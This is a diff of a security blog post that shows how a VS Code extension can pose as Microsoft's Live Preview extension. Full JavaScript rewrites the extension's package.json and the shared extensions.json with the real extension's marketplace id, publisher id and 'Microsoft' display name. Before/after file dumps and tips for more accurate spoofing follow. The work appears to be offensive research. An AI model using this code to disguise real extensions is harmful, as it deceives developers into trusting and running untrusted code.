@@ -144,7 +144,8 @@ Now, if in the original post request - we saw it only takes two parameters: exte
 
 Let's start with some code.
 
-## Back to coding
+## How is it doing that?
+
 
 First, generate a template javascript extension with:
 
@@ -206,35 +207,34 @@ This should install our very basic extension which practically does nothing at t
 
 So, back to VSCode. On a clean installation of VSCode, extensions are stored under `~/.vscode/extensions`. Looking at our post-installation state, we see the following:
 
-```
+```java
 $ ls ~/.vscode/extensions
 extensions.json                            undefined_publisher.vvhich-extension-0.0.1
 ```
 
 The `extensions.json` file looked interesting. Examining it's contents, we see:
 
-```
-$ cat ~/.vscode/extensions/extensions.json | jq 
+```json
 [
-{
-  "identifier": {
-    "id": "undefined_publisher.vvhich-extension"
-  },
-  "version": "0.0.1",
-  "location": {
-    "$mid": 1,
-    "fsPath": "/Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
-    "external": "file:///Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
-    "path": "/Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
-    "scheme": "file"
-  },
-  "relativeLocation": "undefined_publisher.vvhich-extension-0.0.1",
-  "metadata": {
-    "installedTimestamp": 1773697132124,
-    "pinned": true,
-    "source": "vsix"
+  {
+    "identifier": {
+      "id": "undefined_publisher.vvhich-extension"
+    },
+    "version": "0.0.1",
+    "location": {
+      "$mid": 1,
+      "fsPath": "/Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
+      "external": "file:///Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
+      "path": "/Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
+      "scheme": "file"
+    },
+    "relativeLocation": "undefined_publisher.vvhich-extension-0.0.1",
+    "metadata": {
+      "installedTimestamp": 1773697132124,
+      "pinned": true,
+      "source": "vsix"
+    }
   }
-}
 ]
 ```
 
@@ -242,8 +242,7 @@ _Interesting_
 
 Now, lets uninstall our extension and install the [Live Preview extension](https://marketplace.visualstudio.com/items?itemName=ms-vscode.live-server) from the store. Examining the `extensions.json` file after that, we see:
 
-```
-$ cat ~/.vscode/extensions/extensions.json | jq                      
+```json               
 [
   {
     "identifier": {
@@ -281,3 +280,356 @@ So, now we can make a few assumption:
 
 Time to modify our code. 
 
+## I am not what I seem to be
+
+So what is our goal here? Well, ideally, I would like to create an extension which modifies itself and the `extensions.json` file to fake it's identity. For this example, I we would again target the the [Live Preview extension](https://marketplace.visualstudio.com/items?itemName=ms-vscode.live-server) (because its just fun to mess with MSFT stuff). 
+
+So let's write some Javascript code (_ew_). We add the following `updateExtension()` function in the `extension.js` file:
+
+```javascript
+const fs = require("fs");
+const path = require("path");
+const os = require("os");
+ 
+// Log file on the current user's desktop
+const logFile = path.join(os.homedir(), "Desktop", "updateExtension.log");
+ 
+function log(message) {
+  const timestamp = new Date().toISOString();
+  const line = `[${timestamp}] ${message}\n`;
+  console.log(line.trim());
+  fs.appendFileSync(logFile, line);
+}
+
+async function updateExtension() {
+  let new_publisher = "ms-vscode";
+  let new_name = "live-server";
+  log("=== updateExtension started ===");
+  log(`new_publisher: ${new_publisher}, new_name: ${new_name}`);
+
+  // ── 1. Read package.json in the current directory ──────────────────────────
+  const packageJsonPath = path.join(__dirname, "./package.json");
+  log(`Reading package.json from: ${packageJsonPath}`);
+ 
+  const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, "utf8"));
+  const old_name = packageJson.name;
+  const old_publisher = packageJson.publisher? packageJson.publisher: "undefined_publisher";
+  // log(`package.json:\n${packageJson}`);
+  log(`old_publisher: ${old_publisher}, old_name: ${old_name}`);
+
+  // ── 2. POST request to VS Marketplace ──────────────────────────────────────
+  const queryValue = `${new_publisher}.${new_name}`;
+  log(`Making POST request for extension: ${queryValue}`);
+ 
+  const response = await fetch(
+    "https://marketplace.visualstudio.com/_apis/public/gallery/extensionquery",
+    {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        Accept: "application/json;api-version=7.1-preview.1",
+        "User-Agent": "VSCode",
+      },
+      body: JSON.stringify({
+        filters: [
+          {
+            criteria: [{ filterType: 7, value: queryValue }],
+            pageSize: 1,
+            pageNumber: 1,
+            sortBy: 0,
+            sortOrder: 0,
+          },
+        ],
+        assetTypes: [],
+        flags: 950,
+      }),
+    }
+  );
+ 
+  if (!response.ok) {
+    throw new Error(`Marketplace request failed: ${response.status} ${response.statusText}`);
+  }
+ 
+  const marketplaceData = await response.json();
+  log(`Marketplace response received`);
+  log(`Full response: ${JSON.stringify(marketplaceData, null, 2)}`);
+ 
+  const extension = marketplaceData?.results?.[0]?.extensions?.[0];
+  if (!extension) {
+    throw new Error("No extension found in marketplace response");
+  }
+ 
+  const extensionId = extension.extensionId;
+  const publisherId = extension.publisher?.publisherId;
+  const publisherDisplayName = extension.publisher?.displayName;
+  const latestVersion = extension.versions?.[0]?.version;
+ 
+  log(`extensionId: ${extensionId}`);
+  log(`publisherId: ${publisherId}`);
+  log(`publisherDisplayName: ${publisherDisplayName}`);
+  log(`latestVersion: ${latestVersion}`);
+ 
+  // ── 4. Update package.json ──────────────────────────────────────────────────
+  packageJson.name = new_name;
+  packageJson.publisher = new_publisher;
+  packageJson.displayName = extension.displayName;
+  // packageJson.repository.type = "git";
+  // packageJson.repository.url = "https://github.com/microsoft/vscode-livepreview";
+  if (latestVersion) {
+    packageJson.version = latestVersion;
+    log(`package.json updated: name → ${new_name}, publisher → ${new_publisher}, version → ${latestVersion}`);
+  } else {
+    log(`package.json updated: name → ${new_name}, publisher → ${new_publisher}`);
+  }
+  fs.writeFileSync(packageJsonPath, JSON.stringify(packageJson, null, 2));
+ 
+  // ── 5. Read extensions.json one directory above ─────────────────────────────
+  const extensionsJsonPath = path.join(__dirname, "..", "./extensions.json");
+  log(`Reading extensions.json from: ${extensionsJsonPath}`);
+ 
+  const extensions = JSON.parse(fs.readFileSync(extensionsJsonPath, "utf8"));
+ 
+  // ── 6. Find & update the matching entry ────────────────────────────────────
+  const oldId = `${old_publisher}.${old_name}`;
+  const newId = `${new_publisher}.${new_name}`;
+  log(`Looking for entry with id: ${oldId}`);
+ 
+  const entry = extensions.find((e) => e?.identifier?.id === oldId);
+  if (!entry) {
+    throw new Error(`No entry found in extensions.json with id "${oldId}"`);
+  }
+ 
+  log(`Entry found. Updating...`);
+ 
+  // Update identifier id
+  entry.identifier.id = newId;
+  log(`identifier.id → ${newId}`);
+ 
+  // Update version
+  if (latestVersion) {
+    entry.version = latestVersion;
+    log(`version → ${latestVersion}`);
+  }
+ 
+  // Update metadata
+  if (!entry.metadata) entry.metadata = {};
+ 
+  entry.metadata.source = "gallery";
+  log(`metadata.source → gallery`);
+ 
+  entry.metadata.id = extensionId;
+  log(`metadata.id → ${extensionId}`);
+ 
+  if (publisherId) {
+    entry.metadata.publisherId = publisherId;
+    log(`metadata.publisherId → ${publisherId}`);
+  }
+ 
+  if (publisherDisplayName) {
+    entry.metadata.publisherDisplayName = publisherDisplayName;
+    log(`metadata.publisherDisplayName → ${publisherDisplayName}`);
+  }
+ 
+  // ── 7. Write updated extensions.json ───────────────────────────────────────
+  fs.writeFileSync(extensionsJsonPath, JSON.stringify(extensions, null, 2));
+  log(`extensions.json written successfully`);
+  log("=== updateExtension completed ===");
+ 
+  return { entry, marketplaceData };
+}
+```
+
+Breaking down the code, first, we define the following helper function:
+
+```js
+// Log file on the current user's desktop
+const logFile = path.join(os.homedir(), "Desktop", "updateExtension.log");
+ 
+function log(message) {
+  const timestamp = new Date().toISOString();
+  const line = `[${timestamp}] ${message}\n`;
+  console.log(line.trim());
+  fs.appendFileSync(logFile, line);
+}
+```
+
+This is just to help with debugging because sometimes, the extension will crash on you, and logging messages to a file can be really useful.  Next, comes the main `updateExtension` function comes in. 
+
+We start by reading the current extension's `package.json` followed by making a POST request to the marketplace API with the published and extension name set to `ms-vscode` and `live-server` respectively, and storing it's result.
+
+We update the current `package.json` with the name, publisher, version and display name fetched from the POST request.
+
+We then read the `extension.json` file and iterate through it till we find the old entry (aka the original extension id). When a match is found, we replace it with the new extension id (extension id is just: `publisher_name.extension_name` btw). We also update the version information and metadata to replace the metadata id with the one we got from the POST request and change the source from `vsix` to `gallery`.
+
+Finally, we also update the `publisherId` and the `publisherDisplayName` metadata information before saving the updated json. 
+
+With that, we should have covered all our bases. Here is what the extension files would look before and after being activated.
+
+### Before
+
+_package.json_
+
+```json
+{
+  "name": "vvhich-extension",
+  "displayName": "vvhich-extension",
+  "description": "Demo extension",
+  "version": "0.0.1",
+  "engines": {
+    "vscode": "^1.110.0"
+  },
+  "categories": [
+    "Other"
+  ],
+  "activationEvents": [],
+  "main": "./extension.js",
+  "contributes": {
+    "commands": [
+      {
+        "command": "vvhich-extension.helloWorld",
+        "title": "Hello World"
+      }
+    ]
+  },
+  "scripts": {
+    "lint": "eslint .",
+    "pretest": "npm run lint",
+    "test": "vscode-test"
+  },
+  "devDependencies": {
+    "@types/vscode": "^1.110.0",
+    "@types/mocha": "^10.0.10",
+    "@types/node": "22.x",
+    "eslint": "^9.39.3",
+    "@vscode/test-cli": "^0.0.12",
+    "@vscode/test-electron": "^2.5.2"
+  },
+  "__metadata": {
+    "installedTimestamp": 1773737399534,
+    "targetPlatform": "undefined",
+    "size": 4145
+  }
+}
+```
+
+_extensions.json_
+
+```json
+[
+  {
+    "identifier": {
+      "id": "undefined_publisher.vvhich-extension"
+    },
+    "version": "0.0.1",
+    "location": {
+      "$mid": 1,
+      "fsPath": "/Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
+      "external": "file:///Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
+      "path": "/Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
+      "scheme": "file"
+    },
+    "relativeLocation": "undefined_publisher.vvhich-extension-0.0.1",
+    "metadata": {
+      "installedTimestamp": 1773737399525,
+      "pinned": true,
+      "source": "vsix"
+    }
+  }
+]
+```
+
+Extension page:
+
+![](../../hacking/vvhich-extension/before.png)
+
+### After
+
+> [!NOTE] You might need to restart VSCode
+
+_package.json_
+
+```json
+{
+  "name": "live-server",
+  "displayName": "Live Preview",
+  "description": "Demo extension",
+  "version": "0.5.2026020901",
+  "engines": {
+    "vscode": "^1.110.0"
+  },
+  "categories": [
+    "Other"
+  ],
+  "activationEvents": [],
+  "main": "./extension.js",
+  "contributes": {
+    "commands": [
+      {
+        "command": "vvhich-extension.helloWorld",
+        "title": "Hello World"
+      }
+    ]
+  },
+  "scripts": {
+    "lint": "eslint .",
+    "pretest": "npm run lint",
+    "test": "vscode-test"
+  },
+  "devDependencies": {
+    "@types/vscode": "^1.110.0",
+    "@types/mocha": "^10.0.10",
+    "@types/node": "22.x",
+    "eslint": "^9.39.3",
+    "@vscode/test-cli": "^0.0.12",
+    "@vscode/test-electron": "^2.5.2"
+  },
+  "__metadata": {
+    "installedTimestamp": 1773837024644,
+    "targetPlatform": "undefined",
+    "size": 9669
+  },
+  "publisher": "ms-vscode"
+}
+```
+
+_extensions.json_
+
+```json
+[
+  {
+    "identifier": {
+      "id": "ms-vscode.live-server"
+    },
+    "version": "0.5.2026020901",
+    "location": {
+      "$mid": 1,
+      "fsPath": "/Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
+      "external": "file:///Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
+      "path": "/Users/db/.vscode/extensions/undefined_publisher.vvhich-extension-0.0.1",
+      "scheme": "file"
+    },
+    "relativeLocation": "undefined_publisher.vvhich-extension-0.0.1",
+    "metadata": {
+      "installedTimestamp": 1773837024634,
+      "pinned": true,
+      "source": "gallery",
+      "id": "4eae7368-ec63-429d-8449-57a7df5e2117",
+      "publisherId": "5f5636e7-69ed-4afe-b5d6-8d231fb3d3ee",
+      "publisherDisplayName": "Microsoft"
+    }
+  }
+]
+```
+
+Extension page:
+
+![](../../hacking/vvhich-extension/after.png)
+
+AND LOOK AT THAT! We are Live Preview! (Apart from the `README.md` thing - which we can always fix). Not only that, but the links in the bottom right hand corner also redirect to the legit extension's links. 
+
+Here is the Github repo with the extension code: [https://github.com/whokilleddb/vvhich-extension](https://github.com/whokilleddb/vvhich-extension)
+
+> [!WARNING] Is this perfect? NO - you might also wanna update the `.vsixmanifest` files, rename the extension directory, update the `README.md` if you want a more accurate _spoofing_.
+
+_Bye_
+![](https://media.tenor.com/3XNZLG2wpuoAAAAM/sad-pokemon.gif)
